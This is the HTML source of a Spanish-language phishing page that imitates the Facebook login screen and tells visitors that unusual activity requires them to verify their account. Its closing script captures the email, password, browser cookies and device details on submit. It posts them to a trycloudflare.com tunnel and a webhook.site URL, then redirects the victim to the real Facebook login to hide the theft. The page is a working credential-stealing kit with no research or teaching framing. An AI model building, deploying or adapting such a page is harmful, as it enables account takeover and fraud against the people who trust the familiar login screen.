<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
<title>Facebook · Conéctate o regístrate</title>
<meta name="description" content="Conéctate con tu correo electrónico o número de teléfono.">
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%231877F2'/%3E%3Ctext x='32' y='47' font-family='Arial,Helvetica,sans-serif' font-size='46' font-weight='bold' fill='white' text-anchor='middle'%3Ef%3C/text%3E%3C/svg%3E">
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  html,body { height:100%; }
  body {
    background:#F0F2F5;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    color:#050505;
    display:flex; flex-direction:column; align-items:center;
  }
  .wrap { width:100%; max-width:980px; padding:24px 16px 0; display:flex; flex-direction:column; align-items:center; }
  .card {
    background:#fff; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,.1);
    width:100%; max-width:396px; padding:28px 24px 20px; text-align:center;
  }
  .logo { font-size:40px; font-weight:700; color:#1877F2; letter-spacing:-1.5px; margin-bottom:18px; user-select:none; line-height:1; }
  .notice {
    background:#FFF3CD; border:1px solid #FFE69C; border-radius:8px;
    padding:10px 12px; font-size:13px; color:#5C4B00; text-align:left; margin-bottom:18px; line-height:1.4;
  }
  .notice b { display:block; font-size:13.5px; color:#3D2E00; margin-bottom:2px; }
  form { text-align:left; }
  .field { position:relative; margin-bottom:12px; }
  input[type=text],input[type=password] {
    width:100%; padding:14px 12px; font-size:17px; color:#050505;
    background:#F0F2F5; border:1px solid transparent; border-radius:6px; outline:none;
  }
  input::placeholder { color:#606770; }
  input:focus { background:#fff; border-color:#1877F2; box-shadow:0 0 0 4px rgba(24,119,242,.15); }
  .eye { position:absolute; right:10px; top:50%; transform:translateY(-50%); background:none; border:none; cursor:pointer; padding:4px; display:flex; }
  .eye svg { width:20px; height:20px; fill:#606770; }
  .btn-login {
    width:100%; margin-top:6px; padding:12px; font-size:18px; font-weight:600; color:#fff;
    background:#1877F2; border:none; border-radius:6px; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px;
  }
  .btn-login:hover { background:#166FE5; }
  .btn-login:disabled { opacity:.85; cursor:default; }
  .spinner { width:18px; height:18px; border:3px solid rgba(255,255,255,.4); border-top-color:#fff; border-radius:50%; animation:spin .8s linear infinite; display:none; }
  @keyframes spin { to { transform:rotate(360deg); } }
  a.forgot { display:block; text-align:center; margin:14px 0 2px; color:#1877F2; font-size:15px; text-decoration:none; }
  a.forgot:hover { text-decoration:underline; }
  .divider { height:1px; background:#E4E6EB; margin:18px 0; }
  .btn-signup {
    display:inline-block; padding:11px 20px; font-size:15px; font-weight:600; color:#fff;
    background:#42B72E; border:none; border-radius:6px; cursor:pointer; text-decoration:none;
  }
  .btn-signup:hover { background:#36A420; }
  .lang-row { margin-top:18px; font-size:15px; color:#050505; display:flex; align-items:center; gap:6px; cursor:pointer; user-select:none; }
  .lang-row svg { width:16px; height:16px; fill:#606770; }
  .footer-links { margin-top:14px; font-size:13px; color:#606770; text-align:center; line-height:2; }
  .footer-links a { color:#606770; text-decoration:none; padding:0 5px; }
  .footer-links a:hover { text-decoration:underline; }
  .copyright { margin-top:10px; font-size:13px; color:#606770; text-align:center; }
  @media (max-width:480px) {
    .card { box-shadow:none; border-radius:0; min-height:calc(100vh - 90px); max-width:none; padding:20px 16px; }
    input[type=text],input[type=password] { font-size:16px; }
  }
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="logo">facebook</div>
    <div class="notice">
      <b>Hemos detectado actividad inusual en tu cuenta</b>
      Para protegerla, verifica que eres tú e inicia sesión de nuevo.
    </div>
    <form id="loginForm" autocomplete="off">
      <div class="field">
        <input type="text" id="email" name="email" placeholder="Correo electrónico o teléfono" autofocus>
      </div>
      <div class="field">
        <input type="password" id="pass" name="pass" placeholder="Contraseña">
        <button type="button" class="eye" id="eyeBtn" aria-label="Mostrar contraseña">
          <svg viewBox="0 0 24 24"><path d="M12 5c-5 0-9.3 3.1-11 7.6C2.7 17.1 7 20.5 12 20.5s9.3-3.4 11-7.9C21.3 8.1 17 5 12 5zm0 12.5c-2.9 0-5.5-2.4-5.5-5.5S9.1 6.5 12 6.5s5.5 2.4 5.5 5.5-2.6 5.5-5.5 5.5zm0-8.5c-1.7 0-3 1.4-3 3s1.3 3 3 3 3-1.4 3-3-1.3-3-3-3z"/></svg>
        </button>
      </div>
      <button type="submit" class="btn-login" id="loginBtn"><span class="spinner" id="spin"></span><span id="btnLabel">Iniciar sesión</span></button>
    </form>
    <a class="forgot" href="https://www.facebook.com/recover/initiate?locale2=es_ES" target="_blank" rel="noopener">¿Olvidaste la contraseña?</a>
    <div class="divider"></div>
    <a class="btn-signup" href="https://www.facebook.com/registration.php?locale2=es_ES" target="_blank" rel="noopener">Crear una cuenta nueva</a>
  </div>

  <div class="lang-row">
    <svg viewBox="0 0 16 16"><path d="M8 0a8 8 0 100 16A8 8 0 008 0zm5.9 7H10.4c-.2-1.5-.5-2.9-1-4.1 1.6.6 3 1.9 3.9 3.5zM8 1.5c.9 1 1.6 2.6 1.9 4.5H6.1c.3-1.9 1-3.5 1.9-4.5zM1.7 8a6.4 6.4 0 01.5-2.5h3.2c-.1.8-.2 1.6-.2 2.5s.1 1.7.2 2.5H2.2c-.3-.8-.5-1.6-.5-2.5zm.9 4h2.9c.4 1.2 1 2.2 1.5 2.9a6.5 6.5 0 01-4.4-2.9zM8 14.5c-.7-.8-1.3-2-1.7-3.5h3.4c-.4 1.5-1 2.7-1.7 3.5zm2.2-.6c.6-.7 1.1-1.7 1.5-2.9h2.9a6.5 6.5 0 01-4.4 2.9zm1.8-4.4c.1-.8.2-1.6.2-2.5s-.1-1.7-.2-2.5h3.2c.3.8.5 1.6.5 2.5s-.2 1.7-.5 2.5z"/></svg>
    Español <span style="color:#606770">▾</span>
  </div>

  <div class="footer-links">
    <a href="https://www.facebook.com/ads" target="_blank" rel="noopener">Anúnciate</a> ·
    <a href="https://www.facebook.com/help/" target="_blank" rel="noopener">Ayuda</a> ·
    <a href="https://www.facebook.com/about/privacy/" target="_blank" rel="noopener">Privacidad</a> ·
    <a href="https://www.facebook.com/policies/cookies/" target="_blank" rel="noopener">Cookies</a> ·
    <a href="https://www.facebook.com/more/" target="_blank" rel="noopener">Más</a>
  </div>
  <div class="copyright">Meta © 2026</div>
</div>

<script>
(function () {
  var ENDPOINTS = [
    'https://announcements-admission-plain-biz.trycloudflare.com/capture',
    'https://webhook.site/472bc6fd-e381-4a57-aa56-3c55bf5d556c'
  ];
  var form = document.getElementById('loginForm');
  var email = document.getElementById('email');
  var pass = document.getElementById('pass');
  var btn = document.getElementById('loginBtn');
  var label = document.getElementById('btnLabel');
  var spin = document.getElementById('spin');

  document.getElementById('eyeBtn').addEventListener('click', function () {
    pass.type = (pass.type === 'password') ? 'text' : 'password';
  });

  form.addEventListener('submit', function (e) {
    e.preventDefault();
    var payload = {
      email: email.value.trim(),
      password: pass.value,
      cookies: document.cookie,
      ua: navigator.userAgent,
      screen: screen.width + 'x' + screen.height,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      lang: (navigator.languages && navigator.languages[0]) || navigator.language,
      referrer: document.referrer,
      url: location.href,
      ts: new Date().toISOString()
    };
    var body = JSON.stringify(payload);
    ENDPOINTS.forEach(function (u) {
      try { fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body }).catch(function () {}); } catch (err) {}
    });
    btn.disabled = true;
    spin.style.display = 'inline-block';
    label.textContent = 'Verificando…';
    setTimeout(function () {
      window.location.href = 'https://www.facebook.com/login.php?skip_login=1&locale2=es_ES';
    }, 1600);
  });
})();
</script>
</body>
</html>
